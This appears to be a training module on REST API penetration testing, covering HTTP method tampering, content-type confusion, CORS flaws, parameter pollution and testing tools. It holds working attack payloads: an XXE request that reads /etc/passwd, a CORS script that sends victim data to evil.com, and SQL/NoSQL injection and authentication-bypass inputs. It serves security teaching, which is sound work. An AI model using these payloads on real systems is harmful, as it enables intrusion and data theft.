# Unit 11: API Security Testing - Topic 6: REST API Testing

## Overview

REST (Representational State Transfer) APIs are the most widely deployed API architecture, using HTTP methods and URL-based resource identification. REST API security testing combines traditional web testing techniques with API-specific attack vectors including **HTTP method manipulation**, **content-type confusion**, **CORS misconfiguration**, **parameter pollution**, and **versioning exploits**. A thorough REST API penetration test covers authentication, authorization, input validation, business logic, and configuration security across all endpoints and HTTP methods.

---

## 1. REST API Architecture & Attack Surface

### RESTful Design Principles

```
REST Resource-Based URLs:
┌────────────────────────────────────────────────────────────┐
│ Method  │ URL                  │ Action                    │
├─────────┼──────────────────────┼───────────────────────────┤
│ GET     │ /api/users           │ List all users            │
│ POST    │ /api/users           │ Create new user           │
│ GET     │ /api/users/1         │ Get user #1               │
│ PUT     │ /api/users/1         │ Replace user #1           │
│ PATCH   │ /api/users/1         │ Partial update user #1    │
│ DELETE  │ /api/users/1         │ Delete user #1            │
│ OPTIONS │ /api/users           │ Get allowed methods       │
│ HEAD    │ /api/users/1         │ Get headers only          │
└─────────┴──────────────────────┴───────────────────────────┘
```

### REST API Attack Surface Map

```
┌─────────────────────────────────────────────────────────┐
│              REST API Attack Surface                     │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ ┌─────────────┐  ┌──────────────┐  ┌─────────────────┐ │
│ │ HTTP Methods│  │ URL Paths    │  │ Query Params    │ │
│ │ GET, POST,  │  │ /api/v1/...  │  │ ?filter=...     │ │
│ │ PUT, DELETE │  │ Path params  │  │ ?sort=...       │ │
│ │ PATCH, etc. │  │ /users/{id}  │  │ ?page=...       │ │
│ └─────────────┘  └──────────────┘  └─────────────────┘ │
│                                                         │
│ ┌─────────────┐  ┌──────────────┐  ┌─────────────────┐ │
│ │ Headers     │  │ Request Body │  │ Auth Tokens     │ │
│ │ Content-Type│  │ JSON payload │  │ Bearer, API Key │ │
│ │ Accept      │  │ Form data    │  │ Cookies         │ │
│ │ Custom hdrs │  │ XML, files   │  │ OAuth tokens    │ │
│ └─────────────┘  └──────────────┘  └─────────────────┘ │
│                                                         │
│ ┌─────────────┐  ┌──────────────┐  ┌─────────────────┐ │
│ │ Response    │  │ Error Msgs   │  │ CORS Config     │ │
│ │ Status codes│  │ Stack traces │  │ Origin policy   │ │
│ │ Data fields │  │ Debug info   │  │ Credentials     │ │
│ └─────────────┘  └──────────────┘  └─────────────────┘ │
└─────────────────────────────────────────────────────────┘
```

---

## 2. HTTP Method Testing

### Method Enumeration

```bash
# Discover allowed methods
curl -s -X OPTIONS http://target.com/api/users -D - | grep "Allow:"
# Allow: GET, POST, OPTIONS

# Test all methods on each endpoint
methods=("GET" "POST" "PUT" "PATCH" "DELETE" "HEAD" "OPTIONS" "TRACE" "CONNECT")
for method in "${methods[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" \
      http://target.com/api/users)
    echo "$method: $code"
done

# Method Override Headers (bypass method restrictions)
# X-HTTP-Method-Override
curl -X POST http://target.com/api/users/1 \
  -H "X-HTTP-Method-Override: DELETE"

# X-Method-Override
curl -X POST http://target.com/api/users/1 \
  -H "X-Method-Override: PUT"

# X-HTTP-Method
curl -X GET http://target.com/api/users/1 \
  -H "X-HTTP-Method: DELETE"

# _method parameter
curl -X POST "http://target.com/api/users/1?_method=DELETE"
curl -X POST http://target.com/api/users/1 \
  -d "_method=DELETE"
```

### HTTP Verb Tampering

```bash
# Scenario: DELETE /api/users/1 returns 403 (Forbidden)
# Try alternative methods:

# PUT with empty body (effectively deletes data)
curl -X PUT http://target.com/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{}'

# PATCH to deactivate
curl -X PATCH http://target.com/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"active": false, "deleted": true}'

# Non-standard methods (some frameworks accept any method)
curl -X JEFF http://target.com/api/admin/users  # Custom method
# May bypass method-based access control!

# TRACE method (XST - Cross-Site Tracing)
curl -X TRACE http://target.com/api/
# If enabled, may reflect headers including auth tokens
```

---

## 3. Content-Type Manipulation

### Content-Type Confusion

```bash
# Test how server handles different content types
# Some endpoints may process data differently based on Content-Type

# Normal JSON request
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}'

# Same data as form-urlencoded
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=password"

# XML (may enable XXE)
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<root>
  <username>admin</username>
  <password>password</password>
</root>'

# XML with XXE
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <username>&xxe;</username>
  <password>test</password>
</root>'

# Multipart form data
curl -X POST http://target.com/api/login \
  -F "username=admin" \
  -F "password=password"

# No Content-Type (server may default to different parser)
curl -X POST http://target.com/api/login \
  -d '{"username":"admin","password":"password"}'

# Invalid Content-Type
curl -X POST http://target.com/api/login \
  -H "Content-Type: text/plain" \
  -d '{"username":"admin","password":"password"}'
```

---

## 4. CORS Misconfiguration Testing

### Understanding CORS

```
CORS (Cross-Origin Resource Sharing):
Controls which domains can access the API from a browser

┌────────────┐   Request from       ┌──────────┐
│ evil.com   │   evil.com           │  API     │
│ (browser)  │ ─────────────────►  │  Server  │
│            │                      │          │
│            │   Access-Control-    │          │
│            │   Allow-Origin: *   │          │
│            │ ◄─────────────────  │          │
│            │                      │          │
│ Can read   │   Response data      │          │
│ response!  │                      │          │
└────────────┘                      └──────────┘
```

### CORS Testing

```bash
# Test 1: Check if arbitrary origin is reflected
curl -s -D - http://target.com/api/data \
  -H "Origin: http://evil.com" | grep -i "access-control"
# If response includes: Access-Control-Allow-Origin: http://evil.com
# = VULNERABLE (reflects arbitrary origin)

# Test 2: Null origin
curl -s -D - http://target.com/api/data \
  -H "Origin: null" | grep -i "access-control"
# If: Access-Control-Allow-Origin: null → vulnerable

# Test 3: Subdomain bypass
curl -s -D - http://target.com/api/data \
  -H "Origin: http://evil.target.com" | grep -i "access-control"

# Test 4: Check credentials flag
curl -s -D - http://target.com/api/data \
  -H "Origin: http://evil.com" | grep -i "credentials"
# Access-Control-Allow-Credentials: true + reflected origin = CRITICAL

# Test 5: Prefix/suffix bypass
curl -s -D - http://target.com/api/data \
  -H "Origin: http://target.com.evil.com" | grep -i "access-control"
curl -s -D - http://target.com/api/data \
  -H "Origin: http://eviltarget.com" | grep -i "access-control"

# Test 6: Protocol downgrade
curl -s -D - http://target.com/api/data \
  -H "Origin: http://target.com" | grep -i "access-control"
# HTTP origin allowed for HTTPS API?

# CORS exploitation (if vulnerable)
# Host on evil.com:
<script>
fetch('https://target.com/api/user/data', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    // Steal user's API data
    fetch('https://evil.com/steal?data=' + JSON.stringify(data));
});
</script>
```

### CORS Misconfiguration Impact

| Configuration | Risk Level | Impact |
|---------------|------------|--------|
| `Allow-Origin: *` + no credentials | Low | Public data accessible (by design) |
| `Allow-Origin: *` + credentials | **Invalid** | Browsers block this combination |
| Reflected origin + credentials | **CRITICAL** | Full account compromise via any domain |
| `null` origin + credentials | **HIGH** | Exploit via sandboxed iframe |
| Subdomain allowed + credentials | **MEDIUM** | XSS on subdomain → API access |
| Regex bypass + credentials | **HIGH** | Attacker-controlled origin accepted |

---

## 5. Parameter Pollution and Manipulation

### HTTP Parameter Pollution (HPP)

```bash
# Send same parameter multiple times
# Different servers handle this differently:

# Server behavior varies:
GET /api/search?category=electronics&category=clothing
# PHP: Last wins → "clothing"
# ASP.NET: All joined → "electronics,clothing"
# Node.js (Express): Array → ["electronics","clothing"]
# Python (Flask): First wins → "electronics"

# Exploitation: Bypass filters
# WAF blocks: category=admin
# Bypass: category=user&category=admin
# If server takes last value → "admin" passes WAF check

# Parameter override
POST /api/transfer
{
    "amount": 10,
    "to": "friend",
    "amount": 10000    # Duplicate key — which takes effect?
}
```

### JSON-Specific Attacks

```bash
# JSON duplicate keys
POST /api/update
{
    "role": "user",
    "name": "attacker",
    "role": "admin"      # Duplicate — some parsers use last value!
}

# Unicode normalization
POST /api/search
{
    "query": "admin\u0000' OR '1'='1"  # Null byte + SQLi
}

# Type confusion
POST /api/verify
{
    "code": 0         # Integer 0 instead of string "0"
}
# Some languages: 0 == "" == false == null

POST /api/auth
{
    "password": true   # Boolean true — may bypass comparison
}
# PHP: "password123" == true → true!

POST /api/auth
{
    "password": []     # Empty array
}

POST /api/auth
{
    "password": {"$gt": ""}  # NoSQL operator
}

# JSON injection via string
{
    "name": "test\",\"role\":\"admin"
}
# If concatenated into JSON string:
# {"name": "test","role":"admin", ...}
```

---

## 6. REST API Penetration Testing Methodology

### Complete Testing Workflow

```
Phase 1: Reconnaissance
┌──────────────────────────────────────┐
│ □ Discover API documentation         │
│ □ Map all endpoints (Burp, spider)   │
│ □ Identify auth mechanism            │
│ □ Catalog all parameters             │
│ □ Check for old API versions         │
│ □ Review JavaScript for endpoints    │
└──────────────────────────────────────┘

Phase 2: Authentication Testing
┌──────────────────────────────────────┐
│ □ Test missing authentication        │
│ □ Test weak/default credentials      │
│ □ Test token strength and expiry     │
│ □ Test brute force resistance        │
│ □ Test JWT vulnerabilities           │
│ □ Test OAuth flow weaknesses         │
│ □ Test session management            │
└──────────────────────────────────────┘

Phase 3: Authorization Testing
┌──────────────────────────────────────┐
│ □ Test IDOR/BOLA on all endpoints    │
│ □ Test horizontal privilege escalation│
│ □ Test vertical privilege escalation  │
│ □ Test mass assignment               │
│ □ Test function-level access          │
│ □ Test HTTP method-based access       │
└──────────────────────────────────────┘

Phase 4: Input Validation
┌──────────────────────────────────────┐
│ □ Test SQL injection                 │
│ □ Test NoSQL injection               │
│ □ Test command injection             │
│ □ Test XSS (stored via API)          │
│ □ Test XXE (XML content types)       │
│ □ Test SSRF                          │
│ □ Test parameter pollution           │
│ □ Test type confusion                │
└──────────────────────────────────────┘

Phase 5: Configuration
┌──────────────────────────────────────┐
│ □ Test CORS configuration            │
│ □ Check security headers             │
│ □ Test rate limiting                 │
│ □ Check error handling               │
│ □ Test TLS configuration             │
│ □ Check for debug/verbose modes      │
└──────────────────────────────────────┘

Phase 6: Business Logic
┌──────────────────────────────────────┐
│ □ Test workflow bypass               │
│ □ Test race conditions               │
│ □ Test price/quantity manipulation   │
│ □ Test resource exhaustion           │
│ □ Test data export abuse             │
└──────────────────────────────────────┘
```

---

## 7. REST API Testing Tools

### Tool Comparison

| Tool | Strength | Best For |
|------|----------|----------|
| **Burp Suite** | Comprehensive proxy | Full API testing workflow |
| **Postman** | API collections, testing | Functional + security testing |
| **Insomnia** | API client | Quick endpoint testing |
| **curl** | CLI flexibility | Scripted testing |
| **ffuf** | Fast fuzzing | Endpoint/parameter discovery |
| **Arjun** | Param discovery | Hidden parameter finding |
| **Kiterunner** | API-aware discovery | Endpoint enumeration |
| **Nuclei** | Template scanning | Automated vuln scanning |
| **wfuzz** | Web fuzzing | Parameter fuzzing |
| **RESTler** | Stateful API fuzzing | Complex workflow testing |

### Postman Security Testing

```javascript
// Postman Pre-request Script for Auth
pm.environment.set("token", pm.environment.get("auth_token"));

// Postman Test Script for security checks
pm.test("No sensitive data in response", function() {
    var body = pm.response.json();
    pm.expect(JSON.stringify(body)).to.not.include("password");
    pm.expect(JSON.stringify(body)).to.not.include("ssn");
    pm.expect(JSON.stringify(body)).to.not.include("credit_card");
});

pm.test("Security headers present", function() {
    pm.response.to.have.header("X-Content-Type-Options");
    pm.response.to.have.header("X-Frame-Options");
    pm.response.to.have.header("Strict-Transport-Security");
});

pm.test("No stack trace in errors", function() {
    if (pm.response.code >= 400) {
        var body = pm.response.text();
        pm.expect(body).to.not.include("Traceback");
        pm.expect(body).to.not.include("at com.");
        pm.expect(body).to.not.include("at node_modules");
    }
});
```

### Nuclei for API Scanning

```bash
# Scan API with nuclei templates
nuclei -u http://target.com/api/ \
  -t api/ \
  -t exposures/ \
  -t misconfiguration/ \
  -H "Authorization: Bearer TOKEN"

# Custom nuclei template for CORS check
id: cors-misconfig
info:
  name: CORS Misconfiguration
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/"
    headers:
      Origin: "https://evil.com"
    matchers:
      - type: word
        words:
          - "Access-Control-Allow-Origin: https://evil.com"
          - "Access-Control-Allow-Credentials: true"
        condition: and
```

---

## 8. Security Headers for APIs

### Essential API Security Headers

| Header | Value | Purpose |
|--------|-------|---------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Force HTTPS |
| `X-Content-Type-Options` | `nosniff` | Prevent MIME sniffing |
| `X-Frame-Options` | `DENY` | Prevent framing |
| `Content-Security-Policy` | `default-src 'none'` | Restrict resource loading |
| `Cache-Control` | `no-store, no-cache` | Prevent caching sensitive data |
| `X-RateLimit-Limit` | `100` | Communicate rate limits |
| `Access-Control-Allow-Origin` | Specific domain | CORS (not wildcard!) |
| `Content-Type` | `application/json; charset=utf-8` | Explicit content type |

### Header Testing

```bash
# Check all security headers
curl -s -D - http://target.com/api/data | head -30

# Automated header check
python3 -c "
import requests
r = requests.get('http://target.com/api/data')
required = [
    'Strict-Transport-Security',
    'X-Content-Type-Options',
    'X-Frame-Options',
    'Content-Security-Policy',
    'Cache-Control'
]
for header in required:
    if header.lower() in [h.lower() for h in r.headers]:
        print(f'✓ {header}: {r.headers.get(header)}')
    else:
        print(f'✗ {header}: MISSING')
"
```

---

## Summary Table

| Concept | Key Points |
|---------|------------|
| **Method Testing** | Test all HTTP methods; use override headers for bypass |
| **Content-Type** | Switch between JSON/XML/form; XML may enable XXE |
| **CORS** | Test origin reflection, null origin, credential flags |
| **Parameter Pollution** | Duplicate params handled differently per framework |
| **JSON Attacks** | Duplicate keys, type confusion, NoSQL operators |
| **Testing Methodology** | 6 phases: recon → auth → authz → input → config → logic |
| **Tools** | Burp, Postman, ffuf, Nuclei, Kiterunner for comprehensive testing |
| **Security Headers** | HSTS, CSP, X-Content-Type-Options essential for APIs |

---

## Revision Questions

1. Explain HTTP method override headers and how they can be used to bypass method-based access controls.
2. How can Content-Type manipulation lead to XXE attacks on a JSON-based API?
3. Describe CORS misconfiguration with reflected origin and credentials. Why is this critical?
4. What is HTTP Parameter Pollution and how do different server frameworks handle duplicate parameters?
5. Outline a complete REST API penetration testing methodology covering all six phases.
6. Compare three REST API security testing tools and explain when you would use each.

---

*Previous: [05-graphql-security.md](05-graphql-security.md)*

---

*[Back to README](../README.md)*
